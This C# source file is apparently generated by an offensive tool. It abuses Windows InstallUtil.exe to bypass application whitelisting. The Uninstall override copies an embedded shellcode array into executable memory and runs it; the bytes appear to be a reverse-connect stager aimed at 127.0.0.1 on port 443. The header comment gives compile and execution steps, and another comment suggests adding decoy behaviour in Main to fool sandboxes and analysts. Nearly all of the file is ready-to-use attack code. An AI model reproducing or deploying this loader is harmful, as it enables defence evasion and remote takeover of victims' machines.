/*Generated by InstallUtil.py, by @khr0x40sh*/
using System;
using System.Diagnostics;
using System.Reflection;
using System.Configuration.Install;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;

/*
Author: Casey Smith, Twitter: @subTee
License: BSD 3-Clause

Step One:

C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe  /out:exeshell.exe exeshell.cs
Step Two:

C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe /logfile= /LogToConsole=false /U exeshell.exe
See https://gist.github.comsubTee/0dc27475f141cc3a1b50 for details.
*/
namespace Exec
{
	public class Program
	{

		public static void Main()
		{
			Console.WriteLine("Hello From Main...I Don't Do Anything");
			//Add any behaviour here to throw off sandbox execution/analysts :)

		}
	}

	[System.ComponentModel.RunInstaller(true)]
	public class Sample : System.Configuration.Install.Installer
	{
				private static UInt32 MEM_COMMIT = 0x1000;
		private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
		private static UInt32 MEM_RELEASE = 0x8000;

		//The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
		public override void Uninstall(System.Collections.IDictionary savedState)
		{
			Console.WriteLine("Hello From Uninstall...I carry out the real work..."); //debug
			//ShellCode.DoEvil();

			byte[] buf = new byte[281] {
0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,
0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,
0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,
0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,
0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,
0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,
0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,
0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,
0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,
0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,
0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,
0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,
0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x7f,0x00,0x00,0x01,0x68,
0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,
0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,
0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,
0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,
0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,
0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x75,0xee,0xc3 };

			UInt32 funcAddr = VirtualAlloc(0, (UInt32)buf.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
			Marshal.Copy(buf, 0, (IntPtr)(funcAddr), buf.Length);
			IntPtr hThread = IntPtr.Zero;
			UInt32 threadId = 0;

			// prepare data

			PROCESSOR_INFO info = new PROCESSOR_INFO();
			IntPtr pinfo = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(PROCESSOR_INFO)));
			Marshal.StructureToPtr(info, pinfo, false);

			// execute native code

			hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
			WaitForSingleObject(hThread, 0xFFFFFFFF);

			// retrive data

			info = (PROCESSOR_INFO)Marshal.PtrToStructure(pinfo, typeof(PROCESSOR_INFO));
			Marshal.FreeHGlobal(pinfo);
			CloseHandle(hThread);
			VirtualFree((IntPtr)funcAddr, 0, MEM_RELEASE);
		}

		[DllImport("kernel32")]
		private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

		[DllImport("kernel32")]
		private static extern bool VirtualFree(IntPtr lpAddress, UInt32 dwSize, UInt32 dwFreeType);

		[DllImport("kernel32")]
		private static extern IntPtr CreateThread( UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId );

		[DllImport("kernel32")]
		private static extern bool CloseHandle(IntPtr handle);

		[DllImport("kernel32")]
		private static extern UInt32 WaitForSingleObject( IntPtr hHandle, UInt32 dwMilliseconds );

		[DllImport("kernel32")]private static extern IntPtr GetModuleHandle( string moduleName );

		[DllImport("kernel32")]
		private static extern UInt32 GetProcAddress( IntPtr hModule, string procName );

		[DllImport("kernel32")]
		private static extern UInt32 LoadLibrary( string lpFileName );

		[DllImport("kernel32")]
		private static extern UInt32 GetLastError();

		[StructLayout(LayoutKind.Sequential)]
		internal struct PROCESSOR_INFO
		{
			public UInt32 dwMax;
			public UInt32 id0;
			public UInt32 id1;
			public UInt32 id2;
			public UInt32 dwStandard;
			public UInt32 dwFeature;

			// if AMD
			public UInt32 dwExt;
		}

		}
}